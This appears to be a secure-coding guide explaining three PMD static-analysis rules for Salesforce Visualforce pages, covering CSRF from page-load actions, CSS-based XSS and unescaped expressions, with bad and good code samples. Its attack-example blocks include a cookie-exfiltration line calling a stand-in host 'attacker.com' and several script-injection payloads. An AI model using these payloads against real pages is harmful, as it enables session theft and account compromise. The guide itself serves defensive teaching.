# PMD Visualforce Rules

## Overview

Follow these PMD (Programming Mistake Detector) rules when analyzing or generating Salesforce Visualforce pages. PMD is a static code analyzer that identifies security vulnerabilities and common issues in Visualforce.

---

## Security

### 1. VfCsrf

**Priority:** High (1)

**Rule:**  
Avoid calling VF action upon page load as the action becomes vulnerable to CSRF (Cross-Site Request Forgery) attacks.

**Purpose:**

- CSRF attacks can execute unwanted actions on behalf of authenticated users
- Actions triggered on page load bypass user intent verification
- Attackers can craft malicious links that trigger these actions
- Data manipulation can occur without user knowledge
- Violates security best practices for state-changing operations

**CSRF Attack Explanation:**

Cross-Site Request Forgery (CSRF) is an attack where a malicious website tricks a user's browser into making unwanted requests to a trusted site where the user is authenticated.

**Attack Scenario:**

1. User logs into Salesforce
2. Attacker sends user a link to a malicious page
3. Malicious page loads, triggering a request to a Visualforce page
4. Visualforce page with action on page load executes the action
5. Action runs with user's authenticated session

**Example Violations:**

```xml
<!-- Bad - Action on page load (CSRF vulnerable) -->
<apex:page controller="MyController" action="{!deleteRecord}">
    <apex:pageBlock>
        <apex:pageBlockSection>
            Record deleted on page load
        </apex:pageBlockSection>
    </apex:pageBlock>
</apex:page>

<!-- Bad - State-changing action on page load -->
<apex:page controller="AccountController" action="{!updateAccountStatus}">
    <h1>Account Updated</h1>
</apex:page>

<!-- Bad - DML operation on page load -->
<apex:page controller="DataController" action="{!insertData}">
    <apex:form>
        Data inserted automatically
    </apex:form>
</apex:page>
```

**Correct Approach:**

```xml
<!-- Good - Action triggered by user button click -->
<apex:page controller="MyController">
    <apex:form>
        <apex:pageBlock>
            <apex:pageBlockSection>
                <apex:commandButton value="Delete Record"
                                    action="{!deleteRecord}"
                                    onclick="return confirm('Are you sure?');"/>
            </apex:pageBlockSection>
        </apex:pageBlock>
    </apex:form>
</apex:page>

<!-- Good - Action with confirmation -->
<apex:page controller="AccountController">
    <apex:form>
        <apex:pageBlock title="Account Management">
            <apex:commandButton value="Update Status"
                                action="{!updateAccountStatus}"
                                reRender="statusPanel"/>
            <apex:outputPanel id="statusPanel">
                <apex:outputText value="{!statusMessage}"/>
            </apex:outputPanel>
        </apex:pageBlock>
    </apex:form>
</apex:page>

<!-- Good - Safe read-only operations on page load -->
<apex:page controller="DataController" action="{!loadData}">
    <apex:form>
        <apex:pageBlock>
            <apex:pageBlockTable value="{!records}" var="record">
                <apex:column value="{!record.Name}"/>
            </apex:pageBlockTable>
        </apex:pageBlock>
    </apex:form>
</apex:page>
```

**When Page Load Actions Are Acceptable:**

Page load actions are acceptable for:

- **Read-only operations:** Loading data for display
- **Non-state-changing operations:** Setting view state
- **Initialization:** Setting up page context without modifying data

```xml
<!-- Acceptable - Read-only data loading -->
<apex:page controller="ReportController" action="{!initializeReport}">
    <apex:pageBlock>
        <apex:dataTable value="{!reportData}" var="row">
            <apex:column value="{!row.name}"/>
        </apex:dataTable>
    </apex:pageBlock>
</apex:page>
```

**Controller Example - Safe Pattern:**

```java
public class SafeController {
    // Safe - Read-only initialization
    public void initializePage() {
        // Load data for display
        records = [SELECT Id, Name FROM Account LIMIT 10];
    }

    // Unsafe if called on page load - Should require user action
    public PageReference deleteRecord() {
        delete [SELECT Id FROM Account WHERE Id = :recordId];
        return null;
    }

    // Safe pattern - User-triggered action
    public PageReference deleteWithConfirmation() {
        if (ApexPages.currentPage().getParameters().get('confirmed') == 'true') {
            delete [SELECT Id FROM Account WHERE Id = :recordId];
            ApexPages.addMessage(new ApexPages.Message(
                ApexPages.Severity.INFO, 'Record deleted successfully'));
        }
        return null;
    }
}
```

**Best Practices for CSRF Prevention:**

1. Never use action attribute for state-changing operations
2. Use command buttons/links for user-initiated actions
3. Implement confirmation dialogs for destructive operations
4. Use tokens for sensitive operations
5. Validate request origin
6. Implement proper session management

---

### 2. VfHtmlStyleTagXss

**Priority:** High (1)

**Rule:**  
Checks for the correct encoding in `<style/>` tags in Visualforce pages. The rule is based on Salesforce's security guidelines to prevent XSS (Cross-Site Scripting) attacks through CSS injection.

**Purpose:**

- Prevents CSS-based XSS attacks
- Malicious CSS can execute JavaScript
- User input in styles can inject harmful code
- CSS expressions can access sensitive data
- Protects against style-based phishing

**XSS Through CSS Explanation:**

CSS-based XSS attacks exploit browsers that allow JavaScript execution through CSS properties:

- IE supports CSS expressions
- Background URLs can execute JavaScript
- Import statements can load malicious stylesheets
- Custom properties can contain scripts

**Example Violations:**

```xml
<!-- Bad - Unescaped user input in style -->
<apex:page>
    <style>
        .custom {
            color: {!userInputColor};
        }
    </style>
    <div class="custom">Content</div>
</apex:page>

<!-- Bad - Dynamic CSS from controller without encoding -->
<apex:page controller="StyleController">
    <style>
        {!customStyles}
    </style>
</apex:page>

<!-- Bad - User-controlled background URL -->
<apex:page>
    <style>
        .banner {
            background-image: url('{!userProvidedUrl}');
        }
    </style>
</apex:page>

<!-- Bad - CSS expression (IE) -->
<apex:page>
    <style>
        .evil {
            width: expression(alert('XSS'));
        }
    </style>
</apex:page>
```

**Correct Approach:**

```xml
<!-- Good - Use static CSS -->
<apex:page>
    <apex:stylesheet value="{!URLFOR($Resource.CustomStyles, 'main.css')}"/>
    <div class="custom">Content</div>
</apex:page>

<!-- Good - Properly escaped dynamic styles -->
<apex:page controller="StyleController">
    <style>
        .custom {
            color: <apex:outputText value="{!HTMLENCODE(userColor)}" escape="true"/>;
        }
    </style>
</apex:page>

<!-- Good - Validated and sanitized input -->
<apex:page controller="SafeStyleController">
    <style>
        .custom {
            color: {!safeColor};  <!-- Validated in controller -->
        }
    </style>
</apex:page>

<!-- Good - Use Visualforce components -->
<apex:page>
    <apex:pageBlock>
        <apex:pageBlockSection>
            <apex:outputText value="{!content}"
                           styleClass="safe-class"/>
        </apex:pageBlockSection>
    </apex:pageBlock>
</apex:page>
```

**Controller Example - Safe Style Handling:**

```java
public class SafeStyleController {
    public String userColor { get; set; }

    // Validate and sanitize color input
    public String getSafeColor() {
        // Whitelist valid colors
        Set<String> validColors = new Set<String>{
            'red', 'blue', 'green', 'black', 'white'
        };

        if (validColors.contains(userColor.toLowerCase())) {
            return userColor;
        }

        // Default to safe color if invalid
        return 'black';
    }

    // Validate hex colors
    public String getValidatedHexColor() {
        Pattern hexPattern = Pattern.compile('^#[0-9A-Fa-f]{6}$');
        if (hexPattern.matcher(userColor).matches()) {
            return userColor;
        }
        return '#000000';  // Default black
    }
}
```

**CSS Injection Attack Examples:**

```css
/* Attack: JavaScript execution (old IE) */
.evil {
	width: expression(alert(document.cookie));
}

/* Attack: Data theft */
.steal {
	background: url("http://attacker.com/steal?data=" + document.cookie);
}

/* Attack: Import malicious stylesheet */
@import url("http://attacker.com/evil.css");

/* Attack: Font-face with malicious URL */
@font-face {
	src: url('javascript:alert("XSS")');
}
```

**Safe CSS Practices:**

1. **Use static stylesheets:**

```xml
<apex:stylesheet value="{!$Resource.CustomStyles}"/>
```

2. **Validate color inputs:**

```java
public Boolean isValidColor(String color) {
    return Pattern.matches('^#[0-9A-Fa-f]{6}$', color) ||
           Pattern.matches('^rgb\\(\\d+,\\s*\\d+,\\s*\\d+\\)$', color);
}
```

3. **Use component styling:**

```xml
<apex:outputPanel styleClass="safe-class">
    Content
</apex:outputPanel>
```

4. **Implement Content Security Policy:**

```xml
<apex:page contentType="text/html"
           docType="html-5.0">
    <!-- CSP prevents inline styles -->
</apex:page>
```

---

### 3. VfUnescapeEl

**Priority:** High (1)

**Rule:**  
Avoid unescaped user-controlled content in EL (Expression Language) as it results in XSS (Cross-Site Scripting) vulnerabilities.

**Purpose:**

- User input can contain malicious scripts
- Unescaped output executes JavaScript in user's browser
- Can steal session tokens and sensitive data
- Enables phishing attacks
- Compromises user accounts

**XSS Attack Explanation:**

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. Types of XSS:

- **Stored XSS:** Malicious script stored in database
- **Reflected XSS:** Script in URL parameters
- **DOM-based XSS:** Client-side script manipulation

**Example Violations:**

```xml
<!-- Bad - Unescaped user input -->
<apex:page controller="UserController">
    <apex:outputText value="{!userInput}" escape="false"/>
</apex:page>

<!-- Bad - URL parameter without encoding -->
<apex:page>
    <div>
        Welcome {!$CurrentPage.parameters.username}
    </div>
</apex:page>

<!-- Bad - Database field without escaping -->
<apex:page standardController="Account">
    <apex:outputText value="{!Account.Description__c}" escape="false"/>
</apex:page>

<!-- Bad - JavaScript with user input -->
<apex:page>
    <script>
        var userName = '{!userInput}';  // Vulnerable
        alert('Hello ' + userName);
    </script>
</apex:page>

<!-- Bad - HTML attribute with user input -->
<apex:page>
    <div title="{!userInput}">
        Content
    </div>
</apex:page>
```

**Correct Approach:**

```xml
<!-- Good - Escaped by default -->
<apex:page controller="UserController">
    <apex:outputText value="{!userInput}"/>
</apex:page>

<!-- Good - Explicitly escaped -->
<apex:page controller="UserController">
    <apex:outputText value="{!HTMLENCODE(userInput)}"/>
</apex:page>

<!-- Good - URL parameter properly encoded -->
<apex:page>
    <div>
        Welcome <apex:outputText value="{!HTMLENCODE($CurrentPage.parameters.username)}"/>
    </div>
</apex:page>

<!-- Good - JavaScript encoding -->
<apex:page controller="UserController">
    <script>
        var userName = '{!JSENCODE(userInput)}';
        alert('Hello ' + userName);
    </script>
</apex:page>

<!-- Good - URL encoding for URLs -->
<apex:page controller="UserController">
    <a href="/page?param={!URLENCODE(userInput)}">Link</a>
</apex:page>

<!-- Good - Use components that auto-escape -->
<apex:page standardController="Account">
    <apex:pageBlock>
        <apex:pageBlockSection>
            <apex:outputField value="{!Account.Description__c}"/>
        </apex:pageBlockSection>
    </apex:pageBlock>
</apex:page>
```

**Salesforce Encoding Functions:**

| Function           | Use Case           | Example                                    |
| ------------------ | ------------------ | ------------------------------------------ |
| `HTMLENCODE()`     | HTML content       | `{!HTMLENCODE(text)}`                      |
| `JSENCODE()`       | JavaScript strings | `'{!JSENCODE(text)}'`                      |
| `JSINHTMLENCODE()` | JavaScript in HTML | `<script>{!JSINHTMLENCODE(text)}</script>` |
| `URLENCODE()`      | URL parameters     | `?param={!URLENCODE(text)}`                |

**Controller Example - Safe Output:**

```java
public class SafeOutputController {
    public String userInput { get; set; }

    // Pre-encode in controller (not recommended, use VF functions)
    public String getEncodedInput() {
        return String.escapeSingleQuotes(userInput);
    }

    // Validate and sanitize
    public String getSafeInput() {
        if (String.isBlank(userInput)) {
            return '';
        }

        // Remove potentially dangerous characters
        String safe = userInput.replaceAll('[<>&"\']', '');
        return safe;
    }

    // Whitelist approach
    public String getWhitelistedInput() {
        // Only allow alphanumeric and spaces
        return userInput.replaceAll('[^a-zA-Z0-9\\s]', '');
    }
}
```

**XSS Attack Examples:**

```javascript
// Stored XSS in description field
Description: <script>alert(document.cookie)</script>

// Reflected XSS in URL
https://example.com/page?name=<script>steal()</script>

// Event handler injection
Name: " onload="alert('XSS')

// JavaScript protocol
URL: javascript:alert('XSS')

// Image tag injection
Input: <img src=x onerror=alert('XSS')>
```

**Complete Safe Pattern Example:**

```xml
<apex:page controller="SecureController">
    <apex:form>
        <!-- Input with validation -->
        <apex:inputText value="{!userInput}"
                        id="userInput"
                        required="true"/>

        <!-- Safe output in HTML -->
        <apex:outputPanel>
            <h2>User Input (HTML Context):</h2>
            <apex:outputText value="{!HTMLENCODE(userInput)}"/>
        </apex:outputPanel>

        <!-- Safe output in JavaScript -->
        <script>
            var userValue = '{!JSENCODE(userInput)}';
            console.log('Value: ' + userValue);
        </script>

        <!-- Safe output in URL -->
        <apex:outputPanel>
            <h2>Profile Link:</h2>
            <a href="/profile?name={!URLENCODE(userInput)}">
                View Profile
            </a>
        </apex:outputPanel>

        <!-- Safe output in attribute -->
        <div title="{!HTMLENCODE(userInput)}">
            Hover for title
        </div>

    </apex:form>
</apex:page>
```

**When escape="false" Is Necessary:**

Sometimes you need to render HTML, but it must be from a trusted source:

```java
// Controller - Sanitize HTML
public class RichTextController {
    public String richContent { get; set; }

    public String getSanitizedHtml() {
        // Use HTML sanitization library
        // Remove dangerous tags and attributes
        Set<String> allowedTags = new Set<String>{'p', 'b', 'i', 'u', 'br'};

        // Parse and validate HTML
        // Only return if safe
        return sanitizeHtml(richContent, allowedTags);
    }
}
```

```xml
<!-- Only use escape="false" with sanitized content -->
<apex:outputText value="{!sanitizedHtml}" escape="false"/>
```

---

## Complete Security Checklist for Visualforce

### CSRF Prevention

- Never use action attribute for state-changing operations
- Use commandButton/Link for user actions
- Implement confirmation for destructive operations
- Validate request origin
- Use view state tokens

### XSS Prevention

- Always encode user input
- Use appropriate encoding function (HTML, JS, URL)
- Default to escape="true" for outputText
- Validate and sanitize all input
- Use Visualforce components (they auto-encode)
- Implement Content Security Policy
- Never trust user input in JavaScript context

### CSS Injection Prevention

- Use static stylesheets
- Validate color and style inputs
- Avoid user-controlled CSS
- Sanitize any dynamic styles
- Use Visualforce styleClass attributes

---

## Quick Reference

| Rule              | Priority | Attack Type | Prevention                      |
| ----------------- | -------- | ----------- | ------------------------------- |
| VfCsrf            | High (1) | CSRF        | Use commandButton/Link          |
| VfHtmlStyleTagXss | High (1) | XSS via CSS | Validate styles, use static CSS |
| VfUnescapeEl      | High (1) | XSS         | Use HTMLENCODE/JSENCODE         |

---
